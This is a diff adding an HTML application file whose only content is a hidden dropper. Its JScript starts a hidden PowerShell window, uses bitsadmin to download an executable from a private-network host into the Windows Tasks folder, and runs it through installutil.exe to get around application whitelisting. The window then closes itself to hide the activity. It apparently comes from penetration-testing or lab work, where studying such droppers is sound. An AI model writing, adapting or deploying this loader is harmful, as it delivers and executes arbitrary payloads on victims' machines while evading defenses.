@@ -1,0 +1,13 @@
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var re = shell.Run("powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.45.216/h.txt c:\\windows\\Tasks\\p0.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\Tasks\\p0.exe")
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
